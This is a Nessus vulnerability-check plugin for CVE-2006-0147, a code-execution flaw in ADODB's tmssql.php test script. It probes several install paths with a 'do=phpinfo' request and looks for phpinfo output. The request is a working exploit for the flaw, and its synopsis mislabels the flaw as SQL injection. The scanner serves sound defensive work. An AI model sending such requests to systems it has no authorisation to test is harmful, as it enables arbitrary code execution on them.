#
# (C) Tenable Network Security
#


if (description) {
  script_id(20384);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-0147");
  script_xref(name:"OSVDB", value:"22291");

  script_name(english:"ADODB do Command Execution Vulnerability");
  script_summary(english:"Checks for do parameter command execution vulnerability in ADODB");
 
  desc = "
Synopsis :

The remote web server has a PHP script that is affected by a SQL
injection flaw. 

Description :

The remote host is running ADODB, a database abstraction library for
PHP. 

The installed version of ADODB includes a test script named
'tmssql.php' that fails to sanitize user input to the 'do' parameter
before using it execute PHP code.  An attacker can exploit this issue
to execute arbitrary PHP code on the affected host subject to the
permissions of the web server user id. 

See also :

http://secunia.com/secunia_research/2005-64/advisory/
http://www.nessus.org/u?540d6007

Solution : 

Remove the test script or upgrade to ADOdb version 4.70 or higher. 

Risk factor : 

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


if (!thorough_tests) exit(0);


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


subdirs = make_list(
  "/adodb/tests",                      # PHPSupportTickets
  "/lib/adodb/tests",                  # Moodle / TikiWiki
  "/library/adodb/tests",              # dcp_portal
  "/xaradodb/tests"                    # Xaraya
);


# Loop through directories.
foreach dir (cgi_dirs()) {
  foreach subdir (subdirs) {
    # Try to exploit the flaw to display PHP info.
    req = http_get(
      item:string(
        dir, subdir, "/tmssql.php?",
        "do=phpinfo"
      ), 
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if it looks like the output of phpinfo().
    if ("PHP Version" >< res) {
      security_hole(port);
      exit(0);
    }
  }
}
